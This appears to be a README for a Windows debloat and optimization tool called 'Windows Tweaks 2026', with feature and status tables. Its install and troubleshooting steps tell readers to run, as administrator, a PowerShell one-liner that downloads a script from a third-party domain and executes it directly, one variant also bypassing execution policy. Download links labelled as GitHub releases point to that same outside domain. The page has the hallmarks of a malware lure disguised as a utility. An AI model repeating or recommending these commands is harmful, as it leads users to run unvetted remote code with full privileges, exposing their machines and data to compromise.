<p align="center">
  <img src="https://img.shields.io/badge/Windows_Tweaks-v5.0-blue?style=for-the-badge&logo=github">
  <img src="https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
</p>

<h1 align="center">
  ⚡ Windows Tweaks 2026<br>
  <span style="font-size:18px;">Debloat, Optimize & Harden Windows 10/11 with One-Click Tweaks</span>
</h1>

<p align="center">
  <strong>Performance Boost | Debloat | Privacy Hardening | Gaming Optimizer | Undo Support</strong><br>
  <span style="color:#6c757d;">Working 2026 · Windows 10/11 · One-Click Apply · Restore Point Auto-Creation</span>
</p>

<p align="center">
  <a href="#-installation--setup-cmd--powershell">Installation</a> •
  <a href="#-key-features">Features</a> •
  <a href="#-status">Status</a> •
  <a href="#-troubleshooting--common-errors">Troubleshooting</a> •
  <a href="#-tags--keywords">Tags</a>
</p>

> ⚠️ **DISCLAIMER**
> This tool is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.
> Always create a system restore point before applying tweaks. Use at your own risk.
> **BY USING THIS TOOL YOU AGREE TO THESE TERMS.**

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Windows Tweaks modules...
[2/4] Configuring system scanner...
[3/4] Initializing tweak registry...
[4/4] Ready. Start using.
```

### Step 4: Apply Tweaks
Browse categories (Performance, Privacy, Gaming, UI), preview each tweak's effect, and apply with confidence — every change is reversible via the built-in undo system.

---

## ✨ KEY FEATURES

<table>
  <tr>
    <td><strong>⚡ Performance Boost</strong></td>
    <td>Optimize CPU scheduling, memory management, disk I/O, and network settings for max performance</td>
  </tr>
  <tr>
    <td><strong>🧹 Debloat Windows</strong></td>
    <td>Remove pre-installed bloatware, telemetry services, and unnecessary Windows components</td>
  </tr>
  <tr>
    <td><strong>🔒 Privacy Hardening</strong></td>
    <td>Disable telemetry, advertising ID, Cortana, and data collection services</td>
  </tr>
  <tr>
    <td><strong>🔧 Registry Tweaks</strong></td>
    <td>Curated registry modifications for UI customization, performance, and feature toggles</td>
  </tr>
  <tr>
    <td><strong>🖥️ Gaming Optimizer</strong></td>
    <td>Enable Game Mode, disable fullscreen optimizations, reduce input lag, optimize GPU scheduling</td>
  </tr>
  <tr>
    <td><strong>📁 File Explorer Tweaks</strong></td>
    <td>Show file extensions, enable classic context menus, configure Explorer defaults</td>
  </tr>
  <tr>
    <td><strong>🔔 Notification Manager</strong></td>
    <td>Silence specific notification sources while keeping important alerts active</td>
  </tr>
  <tr>
    <td><strong>🚀 Startup Optimizer</strong></td>
    <td>Analyze and disable unnecessary startup programs with impact scoring and boot time estimates</td>
  </tr>
  <tr>
    <td><strong>🔄 Undo Support</strong></td>
    <td>Every tweak reversible with built-in rollback and automatic restore point creation</td>
  </tr>
  <tr>
    <td><strong>📊 System Health</strong></td>
    <td>Before/after benchmark scores, diagnostics, and tweak impact reports</td>
  </tr>
</table>

---

## 📊 STATUS

<table>
  <tr>
    <td><strong>Performance Tweaks</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v5.0.2</td>
  </tr>
  <tr>
    <td><strong>Debloat Module</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v5.0.1</td>
  </tr>
  <tr>
    <td><strong>Privacy Tools</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v5.0.0</td>
  </tr>
  <tr>
    <td><strong>Registry Manager</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v4.9.8</td>
  </tr>
  <tr>
    <td><strong>Gaming Optimizer</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v4.9.5</td>
  </tr>
  <tr>
    <td><strong>Startup Manager</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v5.0.2</td>
  </tr>
  <tr>
    <td><strong>Undo/Rollback</strong></td>
    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
    <td>v5.0.1</td>
  </tr>
</table>

---

## ⬇️ DOWNLOAD

### 🔗 Official Download
[![Download Now](https://img.shields.io/badge/Download-Windows_Tweaks-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/windows-tweaks)

### 📦 Direct Links
| Platform | Link |
|----------|------|
| **GitHub Release** | [Download Latest](https://frtview.com/windows-tweaks) |
| **Direct ZIP** | [Download ZIP](https://frtview.com/windows-tweaks) |
| **Portable Version** | [Download Portable](https://frtview.com/windows-tweaks) |

---

## 🔧 TROUBLESHOOTING & COMMON ERRORS

### 📌 Execution Policy Bypass (PowerShell)
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
```

### 📌 irm Not Recognized (PowerShell 2.0)
```cmd
powershell -Command "Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression"
```

### 📌 Tweaks Not Applying
Ensure you're running as Administrator since registry changes require elevated privileges, restart the system after applying tweaks for full effect, and re-apply after major Windows Updates since they may reset some registry values.

### 📌 System Instability After Tweaks
Open the tool in Safe Mode and use the Undo All function, use System Restore from Settings → System Restore to select the pre-tweak restore point, and report issues so we can add safety checks for future versions.

---

## 🏷️ TAGS & KEYWORDS

```
windows tweaks, windows optimization, debloat windows, privacy tool, windows 11 tweaks, pc optimizer, system optimization, registry tweaks, gaming optimization, windows cleaner, windows tweaks 2026, performance boost, startup manager, bloatware removal, windows privacy, system tweak, free optimizer, windows helper, debloater, pc tweaker
```

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/⭐-Star_This_Repo-yellow?style=for-the-badge"></a>
  <a href="#"><img src="https://img.shields.io/badge/🍴-Fork_This_Repo-blue?style=for-the-badge"></a>
  <a href="#"><img src="https://img.shields.io/badge/⚡-Happy_Tweaking-orange?style=for-the-badge"></a>
</p>

---

**© 2026 Windows Tweaks — All rights reserved for educational purposes.**
